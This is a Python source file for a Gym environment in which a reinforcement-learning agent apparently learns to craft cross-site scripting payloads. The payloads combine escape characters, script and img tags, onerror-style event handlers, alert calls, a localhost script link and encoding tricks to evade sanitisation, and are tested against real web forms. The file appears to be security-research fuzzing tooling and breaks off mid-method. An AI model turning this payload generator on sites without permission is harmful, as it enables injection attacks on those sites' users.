import html

import gym
from gym import spaces
from gym.utils import seeding
from env.connect_crawl_2 import Connections
import numpy as np
import re
import difflib
from bs4 import BeautifulSoup
import urllib
import json
import random
import string
import html


class XSSCrawlEnv(gym.Env):
    metadata = {'render.modes': ['console']}

    def __init__(self, action_space, sites, string_seed, urls,
                 input_tags, transitions, login, features, transition_tags, update_obs, rank):
        super(XSSCrawlEnv, self).__init__()

        self.action_space = spaces.Discrete(action_space)
        self.observation_space = spaces.Box(0, 3000, (1, 2), dtype=int)

        self.login_details = login
        self.current_login = None
        self.logged_in = False

        self.token = self._generate_unique_token()
        self.all_urls = urls
        self.input_transitions = transitions
        self.transition_tags = transition_tags
        self.urls_with_inputable = [urls[i] for i in range(len(urls)) if any(transitions[i][:] != 0)]
        sites = (sites, self.urls_with_inputable[0])
        self.input_tags = input_tags
        self.features = features
        self.source_tags, self.output_locations, self.tag_count = self.sort_tags(sites[1])
        self.sessions = Connections(site=sites, difficulty='medium',
                                    browser='chrome',
                                    injection_form=self.source_tags[0][self.urls_with_inputable[0]][0]['tag_name'],
                                    sink=self.output_locations[0],
                                    input_name=self.source_tags[0][self.urls_with_inputable[0]][0]['name'],
                                    transition_tags=transition_tags, internal_urls=urls, input_tags=input_tags,
                                    logins=login, login_features=features)
        self.injection_form_name = self.source_tags[0][self.urls_with_inputable[0]][0]['name']
        self.urls_attempted = [self.sessions.source]
        if 'URL' in self.sessions.input_names:
            self.urls_with_inputable[self.urls_with_inputable.index(self.output_locations[0])] = self.sessions.source
        self.escape_string, self.escape_tag = self.sessions.check_reflection()
        if self.escape_string == '' or self.escape_tag == ' ':
            self.escape_string = self.sample_escapes()
            self.cleanup_string = self.escape_string
            self.rand_escape = True
        else:
            self.cleanup_string = self.sessions.create_cleanup_string(self.escape_string)
            self.rand_escape = False
        if len(self.escape_string) == 0:
            self.escape_string = ' '
            self.cleanup_string = ' '

        self.input_count = 0
        # initalise the encoding of the value
        self.html_encoded = False
        self.utf8_encoded = False
        self.url_encoded = False

        # initalise the capitalisation value
        self.caps = 0


        # initalise payloads found
        self.payloads_found = {}
        self.relfected_reward = [-1.5, -0.5]
        self.partial_reward = [-2.25, -0.75]
        self.max_reward = 10
        self.current_events = ['', '']
        self.states = {}

        # initalise starting seed
        self.returned_payload = self.token

        self.plain_text_state = self.token
        self.starting_state = np.array([self.add_observation_to_states(self._reduce_observation(string_seed)),
                                        self._context_to_n(self.sessions.context)])
        self.context = self._context_to_n(self.sessions.context)
        self.update_obs = update_obs
        self.submit_all = False
        self.rank = rank
        self.failed_state_pairs = {}


    def get_internal_urls(self):
        return self.sessions.internal_urls

    def set_internal_states(self, states):
        self.states = states[self.rank]

    def send_payload_to_browser(self, payload):
        return self.sessions.test_payload_alert_interaction(payload, self.current_events, self.token)

    def test_send_payload(self, payload):
        return self.sessions.send_payload(payload)

    def get_source_sink(self):
        return (self.sessions.source, self.sessions.sink)

    def get_events(self):
        return self.current_events

    def get_context(self):
        return self._context_to_n(self.sessions.context)

    def get_preamble(self):
        return self.escape_string

    def get_sink(self):
        return self.sessions.sink

    def get_state(self):
        return self.states

    def get_encoding(self):
        if self.html_encoded:
            return 'html'
        if self.url_encoded:
            return 'url'
        if self.utf8_encoded:
            return 'utf8'
        return 'None'

    def update_sanitisation_bypass(self, text_state, encoding, caps, active):
        if active[self.rank]:
            self.plain_text_state = text_state[self.rank]
            if encoding[self.rank] == 'html':
                self.html_encoded = True
            elif encoding[self.rank] == 'utf8':
                self.utf8_encoded = True
            elif encoding[self.rank] == 'url':
                self.url_encoded = True
            self.caps = caps[self.rank]
        return self._reduce_observation(self.plain_text_state)

    def save_session(self):
        self.sessions.save_session_info(str(self.rank))

    def seed(self, seed=None):
        self.np_random, seed = seeding.np_random(seed)
        return [seed]

    def sort_tags(self, source):
        output_locations = self.find_sinks_for_url(source)
        source_tags = self.find_tags_for_sinks(source)
        source_pairings = []
        sink_order = []
        tag_count = {}
        for pairing in range(len(source_tags)):
            for tag in source_tags[pairing][source]:
                source_pairings.append({source: [tag]})
                sink_order.append(output_locations[pairing])
                if tag['name'] in tag_count:
                    tag_count[tag['name']] += 1
                else:
                    tag_count[tag['name']] = 1
        new_source_pairings = sorted(source_pairings, key=lambda k: k[source][0]['name'])
        new_sink_order = [0 for i in range(len(sink_order))]
        for source_pair in new_source_pairings:
            name_idx = {}
            new_sink_order = [0 for i in range(len(sink_order))]
            for idx, old_pair in enumerate(source_pairings):
                name_idx[idx] = old_pair[list(old_pair)[0]][0]['name']
            new_name_idx = {}
            for idx, new_pair in enumerate(new_source_pairings):
                new_name_idx[idx] = new_pair[list(old_pair)[0]][0]['name']
            idx_blacklist = []
            for idx in name_idx.keys():
                for new_idx in new_name_idx.keys():
                    if name_idx[idx] == new_name_idx[new_idx] and new_sink_order[
                        new_idx] == 0 and idx not in idx_blacklist:
                        idx_blacklist.append(idx)
                        new_sink_order[new_idx] = sink_order[idx]
            else:
                new_sink_order[new_source_pairings.index(source_pair)] = sink_order[source_pairings.index(source_pair)]
        i = 0
        while i + 1 < len(new_sink_order):
            if new_sink_order[i] == new_sink_order[i + 1] \
                    and new_source_pairings[i][source][0]['name'] == new_source_pairings[i + 1][source][0]['name']:
                new_sink_order.pop(i + 1)
                new_source_pairings.pop(i + 1)
                i -= 1
            i += 1
        return new_source_pairings, new_sink_order, sorted(tag_count)

    def find_tags_for_sinks(self, url):
        return [self.input_tags[self.all_urls.index(url)][i] for i in range(self.input_tags.shape[0]) if
                self.input_tags[self.all_urls.index(url)][i] != '']

    def find_sinks_for_url(self, url):
        return [self.all_urls[i] for i in range(self.input_tags.shape[0]) if
                self.input_transitions[self.all_urls.index(url), i] != 0]

    def set_sink(self, url):
        self.sessions.sink = url

    def reset(self):
        self.html_encoded = False
        self.utf8_encoded = False
        self.url_encoded = False
        self.current_events = ['', '']
        self.caps = 0
        self.token = self._generate_unique_token()
        self.plain_text_state = self.token
        self.returned_payload = self.token
        return self.starting_state

    def get_escape_tag(self):
        return self.escape_tag

    def get_returned_payload(self):
        return self.returned_payload

    def set_new_token(self):
        new_token = self._generate_unique_token()
        if self.token in self.plain_text_state:
            self.plain_text_state = self.plain_text_state.replace(self.token, new_token)
            self.returned_payload = self.returned_payload.replace(self.token, new_token)
        self.token = new_token

    def get_token(self):
        return self.token

    def get_injection_site(self):
        return self.injection_form_name

    def get_plain_payload(self):
        return self.plain_text_state

    def get_all_payloads_found(self):
        payload_list = []
        for keys in self.payloads_found.keys():
            payload_list.append(keys)
        print(payload_list)
        return payload_list

    def close(self):
        self.sessions.close()

    def change_injection_form(self):
        # check if there are any more output locations to check
        if 'URL' in self.sessions.input_names.keys() and len(
                [input.split('=') for input in self.sessions.source.split('?')[1].split('&')]) > self.input_count + 1:
            self.input_count += 1
            inputs = [input.split('=') for input in self.sessions.source.split('?')[1].split('&')]
            self.injection_form_name = inputs[self.input_count][0]
            self.sessions.input_names = {'URL': inputs}
            self.sessions.injection_form = self.injection_form_name
            self.injection_form = inputs[self.input_count][0]
        elif self.input_count < len(self.source_tags) - 1:
            self.input_count += 1

            self.sessions.internal_urls[self.sessions.internal_urls.index(self.sessions.source)] = \
            list(self.source_tags[self.input_count])[0]
            self.sessions.source = list(self.source_tags[self.input_count])[0]
            self.injection_form_name = self.source_tags[self.input_count][self.sessions.source][0]['name']
            self.sessions.injection_form = self.injection_form_name
            self.sessions.input_names = {self.injection_form_name: ''}
            self.sessions.sink = self.output_locations[self.input_count]
            self.sessions.sink_idx = self.sessions.internal_urls.index(self.sessions.sink)
        else:
            self.input_count = 0
            if ('?' in self.sessions.source and 'URL' in self.sessions.input_names.keys()) or \
                    self.sessions.source.split('?')[0] + '?' in self.urls_with_inputable:
                new_input_idx = self.urls_with_inputable.index(self.sessions.source.split('?')[0] + '?') + 1
            else:
                new_input_idx = self.urls_with_inputable.index(self.sessions.source) + 1
            if new_input_idx >= len(self.urls_with_inputable):
                return None
            if self.urls_with_inputable[new_input_idx].split('?')[0] +'?' in self.urls_attempted or \
                    self.urls_with_inputable[new_input_idx] in self.urls_attempted:
                new_input_idx += 1 # sanity check to prevent any looping
            if new_input_idx >= len(self.urls_with_inputable):
                return None
            new_input_url = self.urls_with_inputable[new_input_idx]
            # for the time being skip the login forms to create users
            if re.search('login', new_input_url, re.IGNORECASE) is not None:
                new_input_idx = self.urls_with_inputable.index(new_input_url) + 1
                new_input_url = self.urls_with_inputable[new_input_idx]
                self.sessions.source = new_input_url
                self.sessions.source_idx = self.all_urls.index(self.sessions.source)
            self.sessions.source = new_input_url
            self.source_tags, self.output_locations, self.tag_count = self.sort_tags(new_input_url)
            possible_url_inputs = self.sessions.source
            input_tag = self.source_tags
            if '?' in self.sessions.source and len(
                    [input.split('=') for input in possible_url_inputs.split('&')]) > self.input_count and \
                    input_tag[0][list(input_tag[0])[0]][0]['tag_name'] == 'URL':
                inputs = [input.split('=') for input in possible_url_inputs.split('?')[1].split('&')]
                self.sessions.input_names = {'URL': inputs}
                self.injection_form_name = inputs[self.input_count][0]
                new_source = self.sessions.source.split('?')[0] + '?'
                self.sessions.internal_urls[self.sessions.internal_urls.index(self.sessions.source)] = new_source
                self.sessions.source = new_source
                self.urls_attempted.append(new_source)
                self.sessions.sink = self.output_locations[0]
                if '?' in self.sessions.sink:
                    new_sink = self.sessions.sink.split('?')[0] + '?'
                else:
                    new_sink = self.sessions.sink
                self.sessions.sink = new_sink
                if new_sink != new_source:
                    self.sessions.internal_urls[self.sessions.internal_urls.index(self.sessions.sink)] = new_sink
                self.urls_with_inputable[self.urls_with_inputable.index(new_input_url)] = self.sessions.source
            else:
                self.injection_form_name = self.source_tags[0][new_input_url][0]['name']
                self.sessions.input_names = {self.injection_form_name: ''}
                self.sessions.sink = self.output_locations[0]
            self.sessions.injection_form = self.injection_form_name

            self.sessions.sink_idx = self.sessions.internal_urls.index(self.sessions.sink)
            self.sessions.source_idx = self.sessions.internal_urls.index(self.sessions.source)

        # check if new page requires to be logged in and the agent is not logged in
        if self.features[self.sessions.internal_urls.index(self.sessions.source)][0] != 0:
            source_login = self.features[self.sessions.internal_urls.index(self.sessions.source)][0]

            login_details = {list(self.login_details)[source_login - 1]: self.login_details[
                list(self.login_details)[source_login - 1]]}
            self.login(login_details)
        self.sessions.form_method = self.sessions.find_form_method(self.injection_form_name)
        if self.features[self.sessions.internal_urls.index(self.sessions.source)][0] != 0:
            self.logout()
        self.escape_string, self.escape_tag = self.sessions.check_reflection()
        if self.escape_string == '':
            self.escape_string = self.sample_escapes()
            self.cleanup_string = self.escape_string
            self.rand_escape = True
        else:
            self.rand_escape = False
            self.cleanup_string = self.escape_string
        if self.escape_tag == '':
            self.escape_tag = 'div'
        return self.injection_form_name

    def get_fuzz_site(self):
        return self.sessions.source

    def get_sessions(self):
        return self.sessions

    def _generate_unique_token(self):
        return ''.join(random.choice(string.digits) for _ in range(10))

    def sample_escapes(self):
        return random.choice(random.choice(["'", '"', '`']))

    def reset_payloads_found(self):
        self.payloads_found = {}

    def step(self, action):
        action_type, var = self._discrete_action_to_continuous(action)
        if action_type == 'js_event':
            next_state = self._add_event('javascript', var)
        elif action_type == 'html_event':
            next_state = self._add_event('html', var)
        elif action_type == 'replace_tag':
            if re.search(r'<[^\s>/]+', self.plain_text_state):
                # tag present from replace tag action
                if len(re.findall('</[^\s>/]+', self.plain_text_state)) == 2:
                    # preamble tag present
                    next_state = re.sub(r'<[^\s>/]+', '<' + var, self.plain_text_state)
                    close_tags = re.finditer('</[^\s>/]+', next_state)
                    closed_tag = next(close_tags)
                    for closed_tag in close_tags:
                        pass
                    next_state = next_state[:closed_tag.start()] + '</' + var + next_state[closed_tag.end():]
                else:
                    # no preamble tag present
                    next_state = re.sub(r'<[^\s>/]+', '<' + var, self.plain_text_state)
                    next_state =  re.sub(r'</[^\s>/]+', '</' + var, next_state)
            else:
                # tag not present from replace tag action
                if re.search('</[^\s>/]+', self.plain_text_state):
                    # tag from preamble
                    tag_end = re.search('</[^\s>/]+', self.plain_text_state).end()
                    next_state = self.plain_text_state[:tag_end+1] + '<' + var + '>'\
                                 + self.plain_text_state[tag_end+1:] +  '</' + var + '>'
                else:
                    # no tag from preamble
                    next_state = '<' + var + '>' + self.plain_text_state + '</' + var + '>'

        elif action_type == 'link':
            if re.search('=http://localhost:666/xss.js', self.plain_text_state, re.IGNORECASE) is not None:
                #link_type = var.split('=')[0]
                next_state = re.sub(' \w+=http://localhost:666/xss.js?=', ' ' + var, self.plain_text_state,
                                    re.IGNORECASE)
                # next_state = self.plain_text_state
            else:
                tag = re.search('<[^\s>/]+', self.plain_text_state)
                if tag:
                    next_state = self.plain_text_state[:tag.end()] + ' ' + var + self.token + self.plain_text_state[
                                                                                              tag.end():]
                else:
                    next_state = self.plain_text_state + ' ' + var + self.token

        elif action_type == 'url':
            if re.search(' http://localhost:666/xss.js', self.plain_text_state, re.IGNORECASE) is not None:
                next_state = re.sub(' http://localhost:666/xss.js?=', ' ' + var, self.plain_text_state,
                                    re.IGNORECASE)
            else:
                tag = re.search('<[^\s>/]+', self.plain_text_state)
                if tag:
                    next_state = self.plain_text_state[:tag.end()+1] + ' ' + var + self.token + self.plain_text_state[
                                                                                              tag.end()+1:]
                else:
                    next_state = self.plain_text_state + ' ' + var + self.token

        elif action_type == 'preamble':
            if re.search(r'<[^\s>/]+', self.plain_text_state):
                # there is a tag from the insert tag action
                if len(re.findall('</[^\s>/]+', self.plain_text_state)) == 2:
                    # there is a preamble tag already
                    next_state = re.sub(r'</[^\s>/]+', '</' + var, self.plain_text_state, count=1)
                else:
                    # there is no preamble tag
                    if len(var) > 0:
                        match = re.search(r'<[^\s>/]+', self.plain_text_state)
                        next_state = self.plain_text_state[:match.start()] + '</' + var + '>' + self.plain_text_state[match.start():]
                    else:
                        next_state = self.plain_text_state
            else:
                # there is no tag from the insert tag action
                if re.search('</[^\s>/]+', self.plain_text_state):
                    # there is a preamble tag already
                    next_state = re.sub(r'</[^\s>/]+', '</' + var, self.plain_text_state)
                else:
                    # there is no preamble tag
                    if len(var) > 0:
                        next_state = '</' + var + '>' + self.plain_text_state
                    else:
                        next_state = self.plain_text_state

        elif action_type == 'postamble':
            if re.search(r'<[^\s>/]+', self.plain_text_state):
                # there is a tag from the insert tag action
                if len(re.findall('<[^\s>/]+', self.plain_text_state)) == 2:
                    # there is a postamble tag already
                    open_tags = re.finditer(r'<[^\s>]+>', self.plain_text_state)

                    open_tag = next(open_tags)
                    for open_tag in open_tags:
                        pass
                    next_state = self.plain_text_state[:open_tag.start()] + '<' + var + '>' + self.plain_text_state[
                                                                                              open_tag.end():]
                    # next_state = re.sub(r'<[^\s/]+>$', '<' + var+'>', self.plain_text_state, count=1)
                else:
                    # there is no postamble tag
                    if len(var) > 0:
                        close_match = re.finditer(r'</[^\s>]+>', self.plain_text_state)
                        close_match_list = re.findall(r'</[^\s>]+>', self.plain_text_state)
                        postamble_match = re.search(r'<[^\s/]+>$', self.plain_text_state)
                        try:
                            if len(close_match_list) > 0:
                                closed_tag = next(close_match)
                                for closed_tag in close_match:
                                    pass
                                try:
                                    next_state = self.plain_text_state[
                                                 :closed_tag.end()] + '<' + var + '>' + self.plain_text_state[
                                                                                        closed_tag.end():]
                                except:
                                    next_state = self.plain_text_state + '<' + var + '>'
                            elif postamble_match is not None:
                                next_state = self.plain_text_state[
                                             :postamble_match.start()] + '<' + var + '>' + self.plain_text_state[
                                                                                           postamble_match.end():]
                            else:
                                next_state = self.plain_text_state + '<' + var + '>'
                        except:
                            pass
                    else:
                        next_state = self.plain_text_state
            else:
                # there is no tag from the insert tag action
                if re.search('<[^\s>/]+', self.plain_text_state):
                    # there is a postamble tag already
                    next_state = re.sub(r'<[^\s>/]+', '<' + var, self.plain_text_state)
                else:
                    # there is no postamble tag
                    if len(var) > 0:
                        next_state = self.plain_text_state + '<' + var + '>'
                    else:
                        next_state = self.plain_text_state
        elif action_type == 'rule':
            if re.search('^\S[^<\s>/]*', self.plain_text_state) is not None and self.plain_text_state[0] != '<':
                # only change the state if the variable is not the escape string
                if var != self.escape_string:
                    if var == '<' and '<<' not in self.plain_text_state and '<' in self.plain_text_state and \
                            re.search(r'<[^\s>/]+', self.plain_text_state) is not None:
                        tag = re.search(r'<[^\s>/]+', self.plain_text_state).group(0)
                        next_state = re.sub(tag, '<' + tag, self.plain_text_state)
                    elif var == '\\' and '\\\'' not in self.plain_text_state and '\\"' not in self.plain_text_state:
                        next_state = re.sub('\'', '\\\'', self.plain_text_state)
                        next_state = re.sub('\"', '\\"', next_state)
                    elif var == ';' and ';' not in self.plain_text_state and self.plain_text_state[
                        0] != ' ' and '-->' not in self.plain_text_state:
                        char = re.search('[\'")]+', self.plain_text_state).group(0)
                        next_state = re.sub(re.escape(char), char + ';', self.plain_text_state)
                    elif var == '>' and re.search('^\S[^<]*', self.plain_text_state) is not None:
                        match = re.search('^\S[^<]*', self.plain_text_state)
                        if match and '>' not in match.group(0):
                            next_state = self.plain_text_state.replace(match.group(0), match.group(0) + '>', 1)
                        else:
                            next_state = self.plain_text_state
                    else:
                        next_state = self.plain_text_state
                elif self.rand_escape:
                    self.escape_string = self.sample_escapes()
                    next_state = re.sub('^\S[^<]+', self.escape_string, self.plain_text_state)
                else:
                    next_state = self.plain_text_state
            else:
                # insert the escape string at the beginning of the state
                if var == self.escape_string:
                    if self.rand_escape:
                        self.escape_string = self.sample_escapes()
                    try:
                        next_state = self.escape_string + self.plain_text_state
                    except:
                        pass
                elif var == '<' and '<<' not in self.plain_text_state and '<' in self.plain_text_state and \
                        re.search(r'<[^\s>/]+', self.plain_text_state) is not None:
                    tag = re.search(r'<[^\s>/]+', self.plain_text_state).group(0)
                    next_state = re.sub(tag, '<' + tag, self.plain_text_state)
                elif var == '>' and re.search('<[^\s>/]*', self.plain_text_state) is not None:
                    match = re.search('<[^\s>/]*', self.plain_text_state).group(0)
                    if match:
                        next_state = re.sub(match, '>' + match, self.plain_text_state, 1)
                    else:
                        next_state = self.plain_text_state
                elif var == '>' and re.search('<', self.plain_text_state) is not None:
                    if self.plain_text_state.count('><') == 1 and re.search('\w><', self.plain_text_state) is not None:
                        next_state = self.plain_text_state.replace('<', '><', 1)
                    elif '><' not in self.plain_text_state:
                        next_state = self.plain_text_state.replace('<', '><', 1)
                    else:
                        next_state = self.plain_text_state
                else:
                    next_state = self.plain_text_state
        elif action_type == 'postrule':
            if re.search('^\S[^<\s>/]*', self.plain_text_state) is not None and self.plain_text_state[
                                                                                -len(self.cleanup_string):] != self.cleanup_string:
                if var == self.cleanup_string:
                    if self.rand_escape:
                        self.cleanup_string = self.escape_string
                    try:
                        next_state = self.plain_text_state + self.cleanup_string
                    except:
                        pass
                else:
                    pass
            else:
                next_state = self.plain_text_state
        elif action_type == 'alert':
            if not re.search(' alert|javascript:alert', self.plain_text_state, re.IGNORECASE):
                if re.search('>.*</', self.plain_text_state, re.IGNORECASE):
                    match = re.search('>.*</', self.plain_text_state, re.IGNORECASE).group(0)
                    next_state = re.sub(re.escape(match), match[:-2]+' ' + var + '(' + self.token + ')' +match[-2:], self.plain_text_state)
                else:
                    next_state = self.plain_text_state + ' ' + var + '(' + self.token + ')'
            else:

                if re.search('javascript:alert', self.plain_text_state, re.I) and var == 'alert':
                    next_state = re.sub('javascript:alert', 'alert', self.plain_text_state, re.I)
                elif re.search(' alert', self.plain_text_state, re.I) and var == 'javascript:alert':
                    next_state = re.sub(' alert', ' javascript:alert', self.plain_text_state, re.I)
                else:
                    next_state = self.plain_text_state


        elif action_type == 'bracket':
            if '(' in self.plain_text_state:
                next_state = self.plain_text_state.replace('(', '`')
                next_state = next_state.replace(')', '`')
            else:
                next_state = self.plain_text_state
        else:
            next_state = self.plain_text_state
        if self.token in next_state and action_type not in 'js_eventhtml_event':
            new_token = self._generate_unique_token()
            next_state = next_state.replace(self.token, new_token)
            self.token = new_token
        if next_state.count(str(self.token)) >= 2 and re.search('[^(=]\d{10}|^\d{10}', next_state) is not None:
            token_match = re.search('[^(=]\d{10}|^\d{10}', next_state)
            slice_end = token_match.end()
            slice_start = slice_end - 10
            next_state = next_state[:slice_start] + next_state[slice_end:]

        self.plain_text_state = next_state

        if self.caps == 2:
            next_state = ''
            i = True
            for char in self.plain_text_state:
                if i:
                    next_state += char.upper()
                else:
                    next_state += char.lower()
                i = not i
            next_state = re.sub('alert', 'alert', next_state, flags=re.I)
        elif self.caps == 1:
            next_state = next_state.capitalize()
            self.caps = 1
            next_state = re.sub('alert', 'alert', next_state, flags=re.I)
        else:
            next_state = next_state.lower()
            self.caps = 0

        if self.html_encoded:
            next_state = ''
            for char in self.plain_text_state:
                next_state += '&#' + (hex(ord(char)))[2:] + ';'
            self.html_encoded = True
        elif self.utf8_encoded:
            next_state = ''
            for char in self.plain_text_state:
                next_state += '\\u00' + (hex(ord(char)))[2:]
            next_state = '"' + next_state + '"'
            self.utf8_encoded = True
        elif self.url_encoded:
            next_state = urllib.parse.quote(self.plain_text_state)
            self.url_encoded = True

        encoded_next_state = self._reduce_observation(self.plain_text_state)

        reward, done, returned_next_state, sanitised = self._compute_reward(next_state)
        if self.update_obs:
            encoded_next_state = self.add_observation_to_states(encoded_next_state)
        info = {'sanitised': sanitised}


        return np.array([encoded_next_state, self.context]), reward, done, info

    # function to add an event (html or javascript) to the state
    def _add_event(self, type, event):
        new_token = self._generate_unique_token()
        if type == 'javascript':
            regex_match = 'javascript:'
        elif type == 'html':
            regex_match = ''
        # check if event exists in string, and has an alert
        event_location = re.search('(\w*)(\S*=\w*' + regex_match + 'alert)', self.plain_text_state, re.IGNORECASE)
        if event_location and event_location.group():
            if re.search('<.*>.*' + event_location.group(), self.plain_text_state) \
                    and re.search('<[^\s>/]+', self.plain_text_state):
                start_tag = re.search('<[^\s>/]+', self.plain_text_state)
                end_tag = re.search('</[^\s>]+', self.plain_text_state)
                if start_tag and end_tag:
                    if start_tag.start() < end_tag.start() or len(re.findall('</[^\s>/]+', self.plain_text_state)) == 2:
                        # order correct for insert
                        state_without_event = self.plain_text_state.replace(
                            " " + event_location.group() + '(' + self.token + ')', '')
                        state_with_event = state_without_event[
                                           :start_tag.end()] + " " + event + "=" + regex_match + "alert(" + new_token + ")" + state_without_event[
                                                                                                                              start_tag.end():]
                    else:
                        # order correct for insert
                        state_without_event = self.plain_text_state.replace(
                            " " + event_location.group() + '(' + self.token + ')', '')
                        state_with_event = state_without_event[
                                           :end_tag.end() + 1] + " " + event + "=" + regex_match + "alert(" + new_token + ")" + state_without_event[
                                                                                                                                end_tag.end() + 1:]
            else:
                state_with_event = re.sub('(\w*)(\S*=\w*' + regex_match + 'alert\(' + self.token + '\))',
                                          event + '=' + regex_match + 'alert(' + new_token + ')', self.plain_text_state,
                                          flags=re.IGNORECASE)
        else:
            # insert an event with an alert
            # check compatiable with encoding to ensure the state is entered
            start_tag = re.search('<[^\s>/]+', self.plain_text_state)
            end_tag = re.search('</[^\s>]+', self.plain_text_state)
            if start_tag and end_tag:
                if start_tag.start() < end_tag.start() or len(re.findall('</[^\s>/]+', self.plain_text_state)) == 2:
                    # order correct for insert
                    state_with_event = self.plain_text_state[:start_tag.end()] \
                                       + " " + event + "=" + regex_match + "alert(" + new_token + ") " + self.plain_text_state[
                                                                                                         start_tag.end():]
                else:
                    state_with_event = self.plain_text_state[:end_tag.end() + 1] \
                                       + " " + event + "=" + regex_match + "alert(" + new_token + ") " + self.plain_text_state[
                                                                                                         end_tag.end() + 1:]

            elif start_tag:
                state_with_event = self.plain_text_state[
                                   :start_tag.end()] + " " + event + "=" + regex_match + "alert(" + new_token + ") " + self.plain_text_state[
                                                                                                                       start_tag.end():]
            else:
                state_with_event = self.plain_text_state + ' ' + event + "=" + regex_match + "alert(" + new_token + ") "
        state_with_event = state_with_event.replace(self.token, new_token)
        self.token = new_token
        return state_with_event

    # function for the agent to compute its reward.
    def _compute_reward(self, next_state):
        # penalty for the whole string being sanitised
        if len(next_state) == 0:
            # invoke second agent
            return -5, 0, next_state, True

        # succeed fast
        if next_state in self.payloads_found.keys():
            self.payloads_found[next_state] += 1
            return self.max_reward, 1, next_state, False

        # send next_state payload to the application return the payload after sanitisation
        payload_returned, page_response = self.sessions.send_payload(next_state)
        self.returned_payload = payload_returned

        # decode the next state to return it to non-URL encoding for comparision to payload_returned
        next_state_decoded = self.plain_text_state

        # match object
        matched_sequences = difflib.SequenceMatcher(None, next_state_decoded.lower(), payload_returned.lower(), False)

        # get all the matches of the payload and the sanitised payload.
        matches = []
        for match_set in (matched_sequences.get_matching_blocks()):
            if match_set[2] != 0 and not next_state_decoded[match_set.a:match_set.a + match_set.size].isalpha():
                matches.append(next_state_decoded[match_set.a:match_set.a + match_set.size])

        # check if the payload is reflected entirely.
        # check if the payload is reflected entirely.
        if (matches and matches[0] == next_state_decoded) or re.search(re.escape(next_state_decoded), payload_returned,
                                                                       re.IGNORECASE):
            # check the reflected payload triggers an alert.
            if self.sessions.test_payload_alert_interaction(next_state, self.current_events, self.token):
                self.payloads_found[next_state] = 1
                return self.max_reward, 1, next_state_decoded, False
            # give a reward that corresponds to the number of special chars returned.
            else:
                # check if the escape has caused a change in context
                context_change = self.sessions.check_context_change(page_response, self.escape_tag, self.token)
                # rendered_payload = connections.test_payload_render(payload_returned, self.test_session)
                special_vals = ['onerror', 'onLoad', 'onKeyPress', 'background', 'onMouseOver',
                                'img', 'script', 'link', 'style', 'body', '<a', 'src', self.escape_tag]
                reward = self.relfected_reward[0]
                # REGEX Patterns to search for in the payload returned most for the initial payload
                for match in matches:
                    for char in special_vals:
                        if re.search(re.escape(char), match, re.IGNORECASE) and reward > self.relfected_reward[0]:
                            reward -= self.relfected_reward[1]
                if context_change is not None:
                    if type(context_change) != tuple:
                        self.context = self._context_to_n(context_change)
                    reward += 0.1
                return reward, 0, next_state_decoded, False
        elif matches and matches[0]:

            # reward for a partial reflection based on the special chars reflected.
            # and checks the payload is actually decoded, otherwise its is a penalty
            if self.sessions.test_payload_alert_interaction(next_state, self.current_events, self.token):
                self.payloads_found[next_state] = 1
                return self.max_reward, 1, payload_returned, True
            else:
                # check if the escape has caused a change in context
                context_change = self.sessions.check_context_change(page_response, self.escape_tag, self.token)

                special_vals = ['onerror', 'onLoad', 'onKeyPress', 'background', 'onMouseOver',
                                'img', 'script', 'link', 'style', 'body', '<a', 'src', self.escape_tag]
                reward = self.partial_reward[0]
                for match in matches:
                    # can check this with beautiful soup
                    soup = BeautifulSoup(match, 'html.parser')
                    if soup:
                        for val in special_vals:
                            if re.search(re.escape(val), match, re.IGNORECASE) and reward > self.partial_reward[0]:
                                reward -= self.partial_reward[1]
                if context_change is not None:
                    if type(context_change) != tuple:
                        self.context = self._context_to_n(context_change)
                    reward += 0.1
                return reward, 0, payload_returned, True
        else:
            # penalty for nothing passing sanitisation.
            return self.partial_reward[0] * 2, 0, '', True

    # Function to convert discrete action (as used by a DQN) to a continuous action (as used by the environment).
    def _discrete_action_to_continuous(self, discrete_action):
        discrete_action = int(discrete_action)
        # actions to introduce special chars to escape the html
        if discrete_action in range(0, 2):
            rule_actions = [self.escape_string, '>']
            continuous_action = ('rule', rule_actions[discrete_action])
        # change the javascript events
        """if discrete_action in range(9, 13):
            event_actions = ['onerror', 'onLoad', 'onKeyPress', 'onMouseOver']
            self.current_events[0] = event_actions[discrete_action - 9].lower()
            continuous_action = ('js_event', event_actions[discrete_action - 9])"""
        # change the html tags
        if discrete_action in range(2, 7):
            tag_actions = ['img', 'script', 'style', 'body', 'a']
            continuous_action = ('replace_tag', tag_actions[discrete_action - 2])
        # insert link payloads.
        if discrete_action in range(7, 9):
            link_actions = ['SRC=http://localhost:666/xss.js?=', 'href=http://localhost:666/xss.js?=']
            continuous_action = ('link', link_actions[discrete_action - 7])
        if discrete_action in range(9, 13):
            event_actions = ['onerror', 'onLoad', 'onKeyPress', 'onMouseOver']
            self.current_events[1] = event_actions[discrete_action - 9].lower()
            continuous_action = ('html_event', event_actions[discrete_action - 9])
        if discrete_action == 13:
            continuous_action = ('preamble', self.escape_tag)
        if discrete_action == 14:
            continuous_action = ('alert', 'alert')
        if discrete_action == 15:
            continuous_action = ('alert', 'javascript:alert')
        if discrete_action == 16:
            continuous_action = ('postrule', self.cleanup_string)
        if discrete_action == 17:
            continuous_action = ('url', 'http://localhost:666/xss.js?=')
            pass
        return continuous_action

    def _reduce_observation(self, state):
        encoded_state = re.sub(r'[0-9]', '', state)
        encoded_state = encoded_state.replace('\\', '\\')
        encoding = {'src': 0, 'onLoad': 1, 'onKeyPress': 2, 'onClick': 3, 'onMouseOver': 4, 'onerror': 5,
                    'img': 6, 'script': 7, 'link': 8, 'style': 9, 'body': 10, '<a': 11, 'a>': 11, 'href': 23,
                    self.escape_tag: 24,
                    '<': 12, '>': 13, '}': 14, ')': 15, "'": 16, '"': 17, '-': 18, '/': 19, ';': 20, '>': 21, '\\': 22}
        for key in encoding:

            if re.search(re.escape(key), self.plain_text_state, re.IGNORECASE) and key != '':
                pattern = re.compile(re.escape(key), re.IGNORECASE)
                matches = pattern.findall(encoded_state)
                for match in matches:
                    encoded_state = encoded_state.replace(match, str(encoding[key]))
        encoded_state = re.sub(r'[^0-9]', '', encoded_state)
        if encoded_state == '':
            encoded_state = 25
        else:
            encoded_state = int(encoded_state)

        return encoded_state

    def add_observation_to_states(self, observation):
        if observation in self.states.keys():
            feature_representation = self.states[observation]
        else:
            feature_representation = max(self.states.values(), default=0) + 1
            self.states[observation] = feature_representation
        return feature_representation

    # func to remove the URL encoding of the state
    def url_decode(self, state):
        return urllib.parse.unquote(state)

    def json_decode(self, state):
        return json.loads(state)

    def html_decode(self, state):
        return html.unescape(state)

    def login(self, details=None):
        if details is not None:
